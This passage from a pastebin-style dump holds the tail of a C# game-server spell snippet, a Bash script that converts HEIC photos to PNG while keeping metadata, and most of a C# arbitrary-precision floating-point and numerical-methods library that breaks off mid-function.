                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Lightning);

                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Thunder))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Thunder);

                        if (!client.MySpells.ClientSpells.ContainsKey((ushort)Role.Flags.SpellID.Cure))
                            client.MySpells.Add(stream, (ushort)Role.Flags.SpellID.Cure);
                    }
                
                }
            }"
nbHjWgcn,HEIC to PNG,karstenw,Bash,Monday 9th of June 2025 10:45:40 AM CDT,"#!/bin/bash
# Script: heic_to_png

if [ -z ""$1"" ]; then
    TARGET_DIR=""$(pwd)""
else
    TARGET_DIR=""$1""
fi

cd ""$TARGET_DIR"" || { echo ""Cannot change into $TARGET_DIR""; exit 1; }

for i in *.heic *.HEIC; do
    [ -f ""$i"" ] || continue
    echo ""Converting $i...""
    heif-convert -q 100 ""$i"" ""${i%.*}.png""
    exiftool -tagsfromfile ""$i"" -all:all ""${i%.*}.png""
done

echo ""conversion done.""
"
VzJy500c,Floats,VNM24ix,C#,Monday 9th of June 2025 10:40:49 AM CDT,"using System;
using System.Linq;
using System.Collections.Generic;
using System.IO;
//using Float.Flt;
//using Float.Cplx;
//using Float.Equations;
//using Float.Program;
using FuncSqrt;
//using FuncSqrt.Flt;

namespace FuncSqrt;
delegate Flt func(Flt x);
delegate Flt funcN(Flt[] x);
delegate Flt func2(Flt x, Flt y);
static class Arr {
  static Random rnd = new Random();
  public static int NZ0(uint[] a) {
    int res = a.Length;
    for (int i = a.Length - 1; i >= 0; i--)
      if (a[i] == 0) res--;
      else break;
    return res;
  }
  public static int NZ(uint[] a) {
    int n0 = NZ0(a);
    if (n0 == 0) return 0;
    int n1 = 4;
    for (int i = 3; i >= 0; i--)
      if ((a[n0 - 1] & (0xff << (i << 3))) == 0) n1--;
      else break;
    uint b = (a[n0 - 1] >> ((n1 - 1) << 3)) & 0xff;
    int n2 = 8;
    for (int i = 7; i >= 0; i--)
      if ((b & (1 << i)) == 0) n2--;
      else break;
    return ((n0 - 1) << 5) + ((n1 - 1) << 3) + n2;
  }
  public static uint[] Copy(uint[] a) {
    uint[] aa = new uint[a.Length];
    a.CopyTo(aa, 0);
    return aa;
  }
  public static uint[] Rand(int size) {
    uint[] a = new uint[size];
    for (int i = 0; i < size; i++)
      for (int j = 0; j < 4; j++)
        a[i] |= (uint)rnd.Next(0x100) << (j << 3);
    return a;
  }
  static string StrB(uint x) {
    string s = """";
    for (int i = 31; i >= 0; i--)
      s += ((x & (1u << i)) > 0 ? '1' : '0');
    return s;
  }
  public static string StrB(uint[] a, bool nz = false) {
    if (NZ0(a) == 0 && nz) return ""0"";
    string s = """";
    for (int i = a.Length - 1; i >= 0; i--)
      s += StrB(a[i]);
    if (nz) {
      int k = 0;
      for (int i = 0; i < s.Length; i++)
        if (s[i] == '0') k++;
        else break;
      s = s.Substring(k, s.Length - k);
    }
    return s;
  }
  public static bool GetBit(uint[] a, int n) {
    if (n > (a.Length << 5) - 1) return false;
    int n0 = n >> 5, n1 = n & 0x1f;
    return (a[n0] & (1 << n1)) > 0;
  }
  public static void SetBit(ref uint[] a, int n, bool f) {
    int n0 = n >> 5, n1 = n & 0x1f;
    if (f && n0 > a.Length - 1) {
      uint[] aa = new uint[n0 + 1];
      a.CopyTo(aa, 0);
      a = aa;
    }
    a[n0] = f ? (a[n0] | (1u << n1)) : (a[n0] & ~(1u << n1));
  }
  public static void SetLen(ref uint[] a, int l) {
    uint[] aa = new uint[l];
    if (l >= a.Length) a.CopyTo(aa, 0);
    else for (int i = 0; i < l; i++) aa[i] = a[i];
    a = aa;
  }
  public static int Cmp(uint[] a, uint[] b) {
    int m = Math.Max(a.Length, b.Length);
    for (int i = m - 1; i >= 0; i--) {
      uint aa = i < a.Length ? a[i] : 0;
      uint bb = i < b.Length ? b[i] : 0;
      if (aa < bb) return -1;
      else if (aa > bb) return 1;
    }
    return 0;
  }
  public static uint[] ShiftL(uint[] a, int n) {
    //Console.WriteLine(""In ShiftL"");
    if (n == 0 || NZ0(a) == 0) return Copy(a);
    int p = NZ(a) - 1 + n;
    //Console.WriteLine($""p={p}  NZ(a)-1={NZ(a) - 1}"");
    int l = Math.Max((p >> 5) + 1, a.Length);
    //Console.WriteLine($""l={l}  a.Length={a.Length}"");
    uint[] aa = new uint[l];
    int n0 = n >> 5, n1 = n & 0x1f;
    for (int i = Arr.NZ0(a) - 1; i >= 0; i--)
      aa[i + n0] = a[i];
    if (n1 > 0) {
      //Console.WriteLine(""In Sh"");
      for (int i = aa.Length - 1; i >= 0; i--) {
        ulong b = ((ulong)aa[i] << 32) | (i > 0 ? aa[i - 1] : 0);
        b <<= n1;
        aa[i] = (uint)(b >> 32);
      }
      //Console.WriteLine(""aa after n1"");
      //Console.WriteLine(Arr.StrB(aa));
    }
    return aa;
  }
  public static uint[] ShiftR(uint[] a, int n) {
    if (n == 0) return Copy(a);
    bool f = GetBit(a, n - 1);
    int n0 = n >> 5, n1 = n & 0x1f;
    uint[] aa = new uint[a.Length];
    for (int i = n0; i < a.Length; i++)
      aa[i - n0] = a[i];
    if (n1 > 0)
      for (int i = 0; i < NZ0(aa); i++) {
        ulong b = aa[i] | ((ulong)(i < aa.Length - 1 ? aa[i + 1] : 0) << 32);
        aa[i] = (uint)(b >> n1);
      }
    if (f) aa = Add(aa, new uint[] { 1 });
    return aa;
  }
  public static uint[] Add(uint[] a, uint[] b) {
    uint[] res = new uint[Math.Max(a.Length, b.Length) + 1];
    uint c = 0;
    for (int i = 0; i < res.Length; i++) {
      ulong aa = i < a.Length ? a[i] : 0;
      ulong s = aa + (i < b.Length ? b[i] : 0) + c;
      res[i] = (uint)s;
      c = (s > uint.MaxValue ? 1u : 0);
    }
    return res;
  }
  public static void DelZeros(ref uint[] a) => SetLen(ref a, NZ0(a));
  public static void DelFirstZeros(ref uint[] a) {
    int k = 0;
    for (int i = 0; i < a.Length; i++)
      if (a[i] == 0) k++;
      else break;
    uint[] aa = new uint[a.Length - k];
    for (int i = 0; i < aa.Length; i++)
      aa[i] = a[k + i];
    a = aa;
  }
  public static uint[] Sub(uint[] a, uint[] b) {
    uint[] res = new uint[Math.Max(a.Length, b.Length)];
    uint c = 0;
    for (int i = 0; i < res.Length; i++) {
      ulong s = 0x100000000ul + (i < a.Length ? a[i] : 0) - (i < b.Length ? b[i] : 0) - c;
      res[i] = (uint)s;
      c = s > uint.MaxValue ? 0 : 1u;
    }
    return res;
  }

  public static uint[] Mul(uint[] a, uint[] b) {
    uint[] res = new uint[a.Length + b.Length];
    for (int i = 0; i < NZ0(a); i++)
      for (int j = 0; j < NZ0(b); j++) {
        ulong w = (ulong)a[i] * b[j];
        int k0 = i + j;
        uint[] u = new uint[] { (uint)w, (uint)(w >> 32) };
        for (int t = 0; t < 2; t++) {
          int k = k0 + t;
          do {
            ulong v = (ulong)res[k] + u[t];
            res[k++] = (uint)v;
            u[t] = (uint)(v >> 32);
          } while (u[t] > 0);
        }
      }
    return res;
  }
}
class Flt {
  public static readonly int N = Program.N;
  uint[] a;
  public uint[] A => Arr.Copy(a);
  public int exp { get; private set; }
  public int sign { get; private set; }
  public Flt(uint[] a, int exp, int sign) {
    if (sign != 0) {
      var v = Norm(a, exp);
      this.a = v.a;
      this.exp = v.exp;
      this.sign = Arr.NZ0(this.a) == 0 ? 0 : Math.Sign(sign);
    } else {
      this.a = new uint[N];
      this.exp = 0;
      this.sign = 0;
    }
  }
  public Flt(Flt x) : this(x.a, x.exp, x.sign) { }
  public static implicit operator Flt(long n) {
    if (n == 0) return Zero;
    int sign = Math.Sign(n);
    ulong u = (ulong)Math.Abs(n);
    uint[] a = new uint[N];
    a[^2] = (uint)u;
    a[^1] = (uint)(u >> 32);
    int d = (N << 5) - Arr.NZ(a);
    int exp = 64 - d;
    a = Arr.ShiftL(a, d);
    return new Flt(a, exp, sign);
  }
  public static implicit operator Flt(double x) {
    string str = x.ToString();
    bool neg = str[0] == '-';
    if (neg) str = str.Substring(1, str.Length - 1);
    int p = str.IndexOf(',');
    if (p == -1) {
      long n = long.Parse(str);
      return (Flt)(neg ? -n : n);
    } else {
      string str0 = str.Substring(0, p);
      string str1 = str.Substring(p + 1, str.Length - p - 1);
      Flt res = (Flt)long.Parse(str0) + (Flt)long.Parse(str1) / ((Flt)10).Pow(str1.Length);
      return neg ? -res : res;
    }
  }
  public Flt Copy => new Flt(a, exp, sign);
  public static Flt[] CopyArr(Flt[] x) {
    Flt[] xx = new Flt[x.Length];
    for (int i = 0; i < x.Length; i++)
      xx[i] = x[i].Copy;
    return xx;
  }
  public Flt Abs => sign >= 0 ? Copy : new Flt(a, exp, 1);
  public static Flt Zero => new Flt(new uint[N], 0, 0);

  public bool IsZero => sign == 0;
  public static (uint[] a, int exp) Norm(uint[] a0, int exp0) {
    //Console.WriteLine(""In norm"");
    int n = Arr.NZ(a0);
    if (n == 0) return (new uint[N], 0);
    if (n == (N << 5)) {
      //Console.WriteLine(""Here"");
      uint[] a = Arr.Copy(a0);
      Arr.SetLen(ref a, N);
      return (a, exp0);
    } else if (n < (N << 5)) return (Arr.ShiftL(a0, (N << 5) - n), exp0 + n - (N << 5));
    else {
      uint[] a = Arr.ShiftR(a0, n - (N << 5));
      Arr.SetLen(ref a, N);
      int exp = exp0 + n - (N << 5);
      return (a, exp);
    }
  }
  public static Flt operator *(Flt x, Flt y) {
    if (x.IsZero || y.IsZero) return Zero;
    uint[] z = Arr.Mul(x.A, y.A);
    z = Arr.ShiftR(z, (N << 5));
    //Console.WriteLine(""in * before norm\n"" + Arr.StrB(z));
    //var v = Norm(z, x.exp + y.exp - (N << 5));
    var v = Norm(z, x.exp + y.exp);
    //Console.WriteLine(""in * after norm\n"" + Arr.StrB(v.a));
    Arr.SetLen(ref v.a, N);
    return new Flt(v.a, v.exp, x.sign * y.sign);
  }
  public bool Eq(Flt x) =>
  sign == x.sign && exp == x.exp && Arr.Cmp(a, x.a) == 0;
  public bool NEq(Flt x) => !Eq(x);
  public Flt Pow(int n) {
    if (n > 1) {
      Flt x = Pow(n / 2);
      Flt x2 = x * x;
      return (n & 1) == 0 ? x2 : x2 * this;
    } else if (n == 1) return Copy;
    else if (n == 0) return 1;
    else return 1 / Pow(-n);
  }
  public static int CmpAbs(Flt x, Flt y) {
    if (x.exp != y.exp) return Math.Sign(x.exp - y.exp);
    else return Arr.Cmp(x.a, y.a);
  }
  static int Cmp(Flt x, Flt y) {
    if (x.sign != y.sign) return Math.Sign(x.sign - y.sign);
    else return CmpAbs(x, y) * x.sign;
  }

  public static bool operator <(Flt x, Flt y) {
    if (x.sign != y.sign) return x.sign < y.sign;
    else if (x.sign == 0) return false;
    else {
      int s = CmpAbs(x, y);
      return x.sign == -s;
    }
  }
  public static bool operator >(Flt x, Flt y) => y < x;


  public Flt Root(int n) {
    Flt x = 1;
    bool f = false;
    while (true) {
      Flt xx = (this / x.Pow(n - 1) + x * (n - 1)) / n;
      if (f) return xx;
      f = x.exp == xx.exp && x.sign == xx.sign;
      for (int i = x.A.Length - 1; i > 0; i--)
        f &= x.A[i] == xx.A[i];
      x = xx;
    }
  }

  public static Flt operator /(Flt x, Flt y) {
    if (y.IsZero) return null;
    else if (x.IsZero) return Zero;
    uint[] xa = x.A;
    uint[] ya = y.A;
    Arr.SetLen(ref xa, N + 1);
    Arr.SetLen(ref ya, N + 1);
    xa = Arr.ShiftL(xa, 31);
    ya = Arr.ShiftL(ya, 16);
    uint[] z = new uint[1];
    while (Arr.NZ(z) <= (N << 5)) {
      ulong u = ((ulong)xa[^1] << 16) | (xa[^2] >> 16);
      uint v = (ya[^1] << 16) | (ya[^2] >> 16);
      uint w = (uint)(u / v);
      uint[] yw = Arr.Mul(ya, new uint[] { w });
      Arr.SetLen(ref yw, N + 1);
      if (Arr.Cmp(xa, yw) < 0) {
        w--;
        yw = Arr.Sub(yw, ya);
      }
      xa = Arr.Sub(xa, yw);
      xa = Arr.ShiftL(xa, 16);
      z = Arr.ShiftL(z, 16);
      z[0] |= w;
    }
    int n = (Arr.NZ0(z) << 5) - Arr.NZ(z);
    //Console.WriteLine($""n={n}"");
    z = Arr.ShiftL(z, n);
    //Console.WriteLine($""zlen={z.Length}"");
    uint[] zz = new uint[N];
    for (int i = 0; i < N; i++)
      zz[^(1 + i)] = z[^(1 + i)];
    //Console.WriteLine(Arr.StrB(zz));
    return new Flt(zz, x.exp - y.exp + 1 - (n & 1), x.sign * y.sign);
  }

  public static Flt operator +(Flt x, Flt y) {
    if (x.sign == 0) return y.Copy;
    else if (y.sign == 0) return x.Copy;
    else {
      uint[] xa = x.A;
      uint[] ya = y.A;
      int expX = x.exp, expY = y.exp;
      bool f = expX > expY || expX == expY && Arr.Cmp(xa, ya) >= 0;
      int d = Math.Max(expX, expY) - Math.Min(expX, expY);
      uint[] r;
      if (f)
        ya = Arr.ShiftR(ya, d);
      else
        xa = Arr.ShiftR(xa, d);
      //Console.WriteLine(""In + xa\n"" + Arr.StrB(xa));
      //Console.WriteLine(""In + ya\n"" + Arr.StrB(ya));
      if (x.sign == y.sign)
        r = Arr.Add(xa, ya);
      else
        r = f ? Arr.Sub(xa, ya) : Arr.Sub(ya, xa);
      //Console.WriteLine(""In + xa+ya\n"" + Arr.StrB(r));
      var v = Norm(r, Math.Max(x.exp, y.exp));
      int sign = f ? x.sign : y.sign;
      return new Flt(v.a, v.exp, sign);
    }
  }
  public static Flt operator -(Flt x) => new Flt(x.a, x.exp, -x.sign);
  public static Flt operator -(Flt x, Flt y) => x + -y;
  public static explicit operator Flt(string str) {
    int indP(string str) {
      int i = str.IndexOf('.');
      return i > -1 ? i : str.IndexOf(',');
    }
    Flt IntToFlt(string str) {
      Flt x = 0;
      for (int i = 0; i < str.Length; i++) {
        x *= 10;
        x += (int)str[i] - (int)'0';
      }
      return x;
    }
    Flt FracToFlt(string str) {
      int p = indP(str);
      if (p == -1) return IntToFlt(str);
      string s0 = str.Substring(0, p);
      string s1 = str.Substring(p + 1, str.Length - (p + 1));
      return IntToFlt(s0) + IntToFlt(s1) / ((Flt)10).Pow(s1.Length);
    }
    if (str[0] == '-') return -(Flt)str.Substring(1, str.Length - 1);
    else if (str[0] == '+') return (Flt)str.Substring(1, str.Length - 1);
    int indE = str.IndexOf('E');
    if (indE == -1) indE = str.IndexOf('e');
    if (indE == -1) return FracToFlt(str);
    else {
      string s0 = str.Substring(0, indE);
      string s1 = str.Substring(indE + 1, str.Length - (indE + 1));
      return FracToFlt(s0) * ((Flt)10).Pow(int.Parse(s1));
    }
  }
  public void ShowB(string name = """") {
    if (name != """") Console.WriteLine(name + "" =\n"");
    string s = Arr.StrB(a);
    for (int i = 0; i < N; i++) {
      string s1 = s.Substring((i << 5), 16);
      Console.ForegroundColor = ConsoleColor.Yellow;
      Console.Write(s1);
      string s2 = s.Substring((i << 5) + 16, 16);
      Console.ForegroundColor = ConsoleColor.Cyan;
      Console.Write(s2);
    }
    Console.Write(""\n"");
    Console.ForegroundColor = ConsoleColor.White;
    Console.Write($""exp={exp}  sign={sign}\n\n"");
  }
  public string Str10 => new Dcm(this).Str();
  public string Str10Round(int n) => new Dcm(this).Str(n);
  public void Show10(string name = """") {
    if (name != """") Console.WriteLine(name + "" ="");
    Console.WriteLine(Str10);
  }
  public void Show10Round(int n, string name = """") {
    if (name != """") Console.WriteLine(name + "" ="");
    string str = Str10Round(n);
    if (str[0] != '-') str = "" "" + str;
    Console.WriteLine(str);
  }
  public static void ShowArray(Flt[] a, int prec, string name, ConsoleColor clr = ConsoleColor.White) {
    Console.ForegroundColor = clr;
    for (int i = 0; i < a.Length; i++) {
      if (name != """") Console.WriteLine($""{name}[{i}] = "");
      a[i].Show10Round(prec);
    }
    Console.ForegroundColor = ConsoleColor.White;
  }


  public class Dcm {
    Flt x;
    public Dcm(Flt x) {
      this.x = x.Copy;
    }
    public uint[] Int() {
      if (x.exp <= 0) return new uint[0];
      uint[] a0 = Arr.ShiftL(x.a, x.exp);
      uint[] a = new uint[a0.Length - N];
      for (int i = 0; i < a.Length; i++)
        a[i] = a0[N + i];
      return a;
    }
    public uint[] Frac() {
      //Console.WriteLine(""In Frac"");
      if (x.exp == 0) return Arr.Copy(x.a);
      else if (x.exp > 0) {
        //Console.WriteLine(""Aaaa"");
        uint[] a = Arr.ShiftL(x.a, x.exp);
        Arr.SetLen(ref a, N);
        return a;
      } else {
        //Console.WriteLine(""Bbbb"");
        int n = ((-x.exp - 1) >> 5) + 1;
        //Console.WriteLine(""n ="" + n);
        uint[] a = x.A;
        Arr.SetLen(ref a, N + n);
        a = Arr.ShiftL(a, (n << 5) + x.exp);
        return a;
      }
    }
    static (uint[] q, uint r) Div(uint[] a, uint b) {
      int n0 = Arr.NZ0(a);
      uint[] q;
      uint r;
      if (n0 < 3) {
        ulong u = n0 == 0 ? 0 : (n0 == 1 ? a[0] : ((ulong)a[1] << 32) | a[0]);
        ulong q0 = u / b;
        r = (uint)(u % b);
        q = (q0 > uint.MaxValue ? new uint[] { (uint)q0, (uint)(q0 >> 32) } :
        new uint[] { (uint)q0 });
      } else {
        uint[] aa = Arr.Copy(a);
        Arr.DelZeros(ref aa);
        uint[] bb0 = new uint[] { b };
        uint[] bb = Arr.ShiftL(bb0, Arr.NZ(aa) - Arr.NZ(bb0) + 1);
        q = new uint[] { 0 };
        while (Arr.Cmp(bb, bb0) == 1) {
          bb = Arr.ShiftR(bb, 1);
          q = Arr.ShiftL(q, 1);
          if (Arr.Cmp(aa, bb) >= 0) {
            aa = Arr.Sub(aa, bb);
            q[0]++;
          }
        }
        r = aa[0];
      }
      return (q, r);
    }
    static string DcmInt(uint[] a) {
      var l = new List<uint>();
      uint[] aa = Arr.Copy(a);
      while (Arr.NZ0(aa) > 0) {
        var v = Div(aa, 1000000000u);
        l.Add(v.r);
        aa = v.q;
      }
      if (l.Count == 0) return ""0"";
      string res = """";
      for (int i = l.Count - 1; i >= 0; i--) {
        string s = l[i].ToString();
        if (i < l.Count - 1) s = new String('0', 9 - s.Length) + s;
        res += s;
      }
      return res;
    }
    public string DcmInt() => DcmInt(Int());
    static string DcmFrac(uint[] a) {
      //Console.WriteLine(""In DcmFrac"");
      uint[] aa = Arr.Copy(a);
      var l = new List<uint>();
      while (Arr.NZ0(aa) > 0) {
        Arr.DelFirstZeros(ref aa);
        Arr.SetLen(ref aa, aa.Length + 1);
        uint c = 0;
        for (int i = 0; i < aa.Length; i++) {
          ulong s = (ulong)aa[i] * 1000000000u + c;
          aa[i] = (uint)s;
          c = (uint)(s >> 32);
        }
        l.Add(aa[aa.Length - 1]);
        Arr.SetLen(ref aa, aa.Length - 1);
      }
      string res = """";
      for (int i = 0; i < l.Count; i++) {
        string s = l[i].ToString();
        s = new String('0', 9 - s.Length) + s;
        res += s;
      }
      return res == """" ? ""0"" : res;
    }
    public string DcmFrac() => DcmFrac(Frac());
    public string Str() {
      if (x.IsZero) return ""0"";
      int l = (int)Math.Round(N * 9.6) - 1;
      string res;
      string sInt = DcmInt();
      string sFrac = DcmFrac();
      //if (sInt.Length >= l) return sInt;
      if (sInt.Length >= l) res = sInt;
      else if (sInt != ""0"") {
        if (sInt.Length + sFrac.Length <= l) res = sInt + ""."" + sFrac;
        else res = sInt + ""."" + sFrac.Substring(0, l - sInt.Length);
      } else {
        int k = 0;
        for (int i = 0; i < sFrac.Length; i++)
          if (sFrac[i] != '0') break;
          else k++;
        //return ""0."" + (sFrac.Length < k + l ? sFrac : sFrac.Substring(0, k + l));
        res = ""0."" + (sFrac.Length < k + l ? sFrac : sFrac.Substring(0, k + l));
      }
      return (x.sign < 0 ? ""-"" : """") + res;
    }
    public string Str(int n) {
      string str = Str();
      //Console.WriteLine(""str="" + str);
      bool neg = str[0] == '-';
      //Console.WriteLine(""neg="" + neg);
      //Console.WriteLine(neg + "" "" + str[0]);
      if (neg) str = str.Substring(1, str.Length - 1);
      //Console.WriteLine(""str0="" + str);
      int p = str.IndexOf('.');
      if (str.Length <= p + 1 + n) return (neg ? ""-"" : """") + str;//str;
      bool f = str[p + 1 + n] > '4';
      str = str.Substring(0, p + 1 + n);
      if (!f) return (neg ? ""-"" : """") + str;
      int k = -1;
      for (int i = str.Length - 1; i >= 0; i--)
        if (Char.IsDigit(str[i]) && str[i] < '9') { k = i; break; }
      if (k == -1) { str = ""0"" + str; k = 0; }
      //Console.WriteLine(""str="" + str);
      string str1 = str.Substring(0, k);
      str1 += (char)((int)str[k] + 1);
      for (int i = k + 1; i < str.Length; i++)
        str1 += (str[i] == '.' ? '.' : '0');
      //Console.WriteLine(""check neg"");
      return neg ? ""-"" + str1 : str1;
    }
  }

  public class Polyn {
    Flt[] a;
    public int L => a.Length;
    public int N => L - 1;
    public Flt[] A {
      get {
        Flt[] aa = new Flt[L];
        for (int i = 0; i < L; i++) aa[i] = a[i].Copy;
        return aa;
      }
    }
    public Flt this[int i] { get { return a[i].Copy; } set { a[i] = value.Copy; } }
    public Polyn(params Flt[] a) {
      this.a = new Flt[a.Length];
      for (int i = 0; i < a.Length; i++)
        this.a[i] = a[i].Copy;
    }
    //public static Polyn Zero => new Polyn(new Flt[0]);
    public static Polyn operator -(Polyn p) {
      Flt[] a = new Flt[p.L];
      for (int i = 0; i < p.L; i++) a[i] = -p[i];
      return new Polyn(a);
    }
    public static Polyn operator +(Polyn p1, Polyn p2) {
      Flt[] a = new Flt[Math.Max(p1.L, p2.L)];
      for (int i = 0; i < a.Length; i++)
        a[i] = (i < p1.L ? p1[i] : 0) + (i < p2.L ? p2[i] : 0);
      return new Polyn(a);
    }
    public static Polyn operator -(Polyn p1, Polyn p2) => p1 + -p2;
    public static Polyn operator *(Polyn p, Flt Œº) {
      Polyn pp = new Polyn(p.a);
      for (int i = 0; i < pp.L; i++) pp[i] *= Œº;
      return pp;
    }
    public static Polyn operator *(Flt Œº, Polyn p) => p * Œº;
    public static Polyn operator *(Polyn p1, Polyn p2) {
      Flt[] a = new Flt[p1.L + p2.L - 1];
      for (int i = 0; i < p1.L; i++)
        for (int j = 0; j < p2.L; j++) {
          int k = i + j;
          if (a[k] == null) a[k] = 0;
          a[k] += p1[i] * p2[j];
        }
      return new Polyn(a);
    }

    public Flt Value(Flt x) {
      Flt res = 0;
      for (int i = N; i >= 0; i--) {
        res *= x;
        res += a[i];
      }
      return res;
    }
    public Polyn D1 {
      get {
        if (L == 0) return new Polyn(new Flt[0]);
        Flt[] aa = new Flt[N];
        for (int i = 0; i < N; i++)
          aa[i] = a[i + 1] * (i + 1);
        return new Polyn(aa);
      }
    }
    public Polyn D2 => D1.D1;
    public Polyn Intg {
      get {
        Flt[] aa = new Flt[L + 1];
        aa[0] = 0;
        for (int i = 1; i <= L; i++)
          aa[i] = a[i - 1] / i;
        return new Polyn(aa);
      }
    }
  }
  static class M {
    public static readonly Flt œÄ = GetPi();
    static Flt GetPi() =>
      (ArcTg0((Flt)1 / 5) * 4 - ArcTg0((Flt)1 / 239)) * 4;
    //ArcSin0((Flt)1 / 2) * 6;
    public static readonly Flt Œµ0 = GetEps(-Flt.N * 16);
    public static readonly Flt Œµ1 = GetEps(-Flt.N * 11);
    public static readonly Flt Œµ2 = GetEps(-Flt.N * 22);
    static Flt GetEps(int n) {
      uint[] a = new uint[Flt.N];
      Arr.SetBit(ref a, (Flt.N << 5) - 1, true);
      return new Flt(a, n, 1);
    }
    public static readonly Flt ln2 = GetLn2();
    static Flt GetLn2() => Ln0((Flt)4 / 3) - Ln0((Flt)2 / 3);
    static Flt Ln0(Flt x) {
      Flt y = x - 1;
      Flt res = y.Copy;
      Flt z = y.Copy;
      int n = 1;
      while (true) {
        Flt t = res + (z = -z * y) / (++n);
        if (t.Eq(res)) return res;
        res = t;
      }
    }
    public static Flt Ln(Flt x) {
      if (x.sign != 1) return null;
      Flt y = new Flt(x.A, 1, 1);
      Flt z = (y - 1) / (y + 1);
      return Ln0(1 + z) - Ln0(1 - z) + (x.exp - 1) * ln2;
    }

    public static Flt Sin(Flt x) {
      Flt t = x.Copy;
      while (t.Abs > M.œÄ)
        if (t.sign == 1) t -= M.œÄ * 2;
        else t += M.œÄ * 2;
      Flt xx = t * t;
      Flt y = t.Copy;
      Flt s = t.Copy;
      int n = 0;
      //bool f = false;
      while (true) {
        n += 2;
        y = -y * xx / (n * (n + 1));
        Flt st = s + y;
        if (st.Eq(s)) return st;
        s = st;
      }
    }
    public static Flt Cos(Flt x) {
      Flt t = x.Copy;
      while (t.Abs > M.œÄ)
        if (t.sign == 1) t -= M.œÄ * 2;
        else t += M.œÄ * 2;
      Flt xx = t * t;
      Flt y = 1;
      Flt s = 1;
      int n = 0;
      while (true) {
        n += 2;
        y = -y * xx / (n * (n - 1));
        Flt st = s + y;
        if (st.Eq(s)) break;
        s = st;
      }
      return s;
    }
    public static Flt Tg(Flt x) => Sin(x) / Cos(x);
    public static Flt Exp(Flt x) {
      if (x.IsZero) return 1;
      else if (x.sign == -1) return 1 / Exp(-x);
      else {
        Flt y = x.exp > 0 ? new Flt(x.A, 0, 1) : x.Copy;
        Flt res = 1, z = 1;
        int n = 0;
        while (true) {
          Flt t = res + (z *= y / ++n);
          if (t.Eq(res)) break;
          res = t;
        }
        for (int i = 0; i < x.exp; i++)
          res = res.Pow(2);
        return res;
      }
    }
    public static Flt ArcTg0(Flt x) {
      Flt y = x.Copy;
      Flt xx = x * x;
      Flt res = x.Copy;
      int n = 1;
      while (true) {
        n += 2;
        Flt t = res + (y = -y * xx) / n;
        if (t.Eq(res)) break;
        res = t;
      }
      return res;
    }
    public static Flt ArcTg(Flt x) {
      if (x < 0) return -ArcTg(-x);
      else if (x > 1) return œÄ / 2 - ArcTg(1 / x);
      else return Newton(t => Tg(t) - x, (Flt)11 / 28);
    }
    public static Flt ArcSin0(Flt x) =>
    Newton(t => Sin(t) - x, (Flt)11 / 28);

    public static Flt Pow(Flt x, Flt y) =>
    Exp(y * Ln(x));
    public static func D1(func F) =>
    x => (F(x + Œµ1 / 2) - F(x - Œµ1 / 2)) / Œµ1;
    public static Flt Newton(func F, Flt x0) {
      func Fx = D1(F);
      int cnt = 0;
      Flt x = x0.Copy;
      bool f = false;
      while (true) {
        Flt xx = x - F(x) / Fx(x);
        if (cnt == 5) return (xx + x) / 2;
        f = (x - xx).Abs < Œµ0;
        if (f) cnt++;
        else cnt = 0;
        x = xx;
      }
    }
    public static Flt Intg(func F, Flt a, Flt b, int n = 1) {
      if (n == 1) {
        Flt h = b - a, hh = h / 6;
        Flt x0 = a;
        Flt x6 = b;
        Flt x3 = (a + b) / 2;
        Flt x1 = a + hh;
        Flt x2 = x3 - hh;
        Flt x4 = x3 + hh;
        Flt x5 = x6 - hh;
        Flt y3 = F(x3);
        Flt y24 = (F(x2) + F(x4)) / 2;
        Flt y15 = (F(x1) + F(x5)) / 2;
        Flt y06 = (F(x0) + F(x6)) / 2;
        return
        (y3 * 136 + y24 * 27 + y15 * 216 + y06 * 41) * h / 420;
      } else {
        Flt res = 0;
        Flt h = (b - a) / n;
        for (int i = 0; i < n; i++) {
          Flt aa = a + h * i;
          Flt bb = aa + h;
          res += Intg(F, aa, bb);
        }
        return res;
      }
    }
    public static Flt Dihotom(func F, Flt a, Flt b, Flt Œµ) {
      Flt aa = a.Copy, bb = b.Copy;
      Flt fa = F(aa), fb = F(bb);
      while ((aa - bb).Abs > Œµ) {
        Flt c = (aa + bb) / 2, fc = F(c);
        if (fc.Eq(0)) return c;
        if (fc.sign == fa.sign) aa = c.Copy;
        else bb = c.Copy;
      }
      return (fb * aa - fa * bb) / (fb - fa);
    }

  }


  /*
    public static Flt[] Grad(funcN f, Flt[] x) {
      var gr = new Flt[x.Length];
      for (int i = 0; i < gr.Length; i++)
        gr[i] = D1(f, i, x);
      return gr;
    }
   
  */
  class Equations {
    public static Flt D1(funcN f, Flt[] x, int n) {
      Flt[] x1 = Flt.CopyArr(x);
      x1[n] -= M.Œµ1 / 2;
      Flt[] x2 = Flt.CopyArr(x);
      x2[n] += M.Œµ1 / 2;
      return (f(x2) - f(x1)) / M.Œµ1;
    }
    public static Flt[] Grad(funcN f, Flt[] x) {
      var gr = new Flt[x.Length];
      for (int i = 0; i < gr.Length; i++)
        gr[i] = D1(f, x, i);
      return gr;
    }
    static (Flt[,] a, Flt[] b) Mx(funcN[] f, Flt[] x) {
      var a = new Flt[f.Length, f.Length];
      var b = new Flt[f.Length];
      for (int i = 0; i < f.Length; i++) {
        b[i] = -f[i](x);
        for (int j = 0; j < x.Length; j++) {
          a[i, j] = D1(f[i], x, j);
        }
      }
      return (a, b);
    }
    public static (Flt[] x, Flt max) Xnew(funcN[] f, Flt[] x0, double Œº = 1) {
      var mx = Mx(f, x0);
      Flt[] dx = Matr.SolveLinEq(mx.a, mx.b);
      Flt[] x = new Flt[x0.Length];
      for (int i = 0; i < x.Length; i++)
        x[i] = x0[i] + dx[i] * Œº;
      Flt max = 0;
      for (int i = 0; i < dx.Length; i++)
        if (dx[i].Abs > max) max = dx[i].Abs;
      return (x, max);
    }
    public static Flt[] Solve(funcN[] f, Flt[] x0) {
      double Œº = 0.5;
      bool s = false;
      Flt[] x = Flt.CopyArr(x0);

      while (true) {
        var v = Xnew(f, x, Œº);
        if (s) return v.x;
        else if (v.max < M.Œµ2) s = true;
        else if (v.max < 0.001) Œº = 1;
        x = v.x;

        ////////////////////////////
        Console.Clear();
        for (int i = 0; i < x.Length; i++)
          x[i].Show10();
        //Console.WriteLine();
        //Console.ReadLine();
        ////////////////////////////

      }
    }
    public static class Matr {
      static bool IsZero(Flt x) => x.Abs < M.Œµ2;
      static Flt[,] Inv(Flt[,] a0) {
        int n = a0.GetLength(0), nn = n * 2;
        Flt[,] a = new Flt[n, nn];
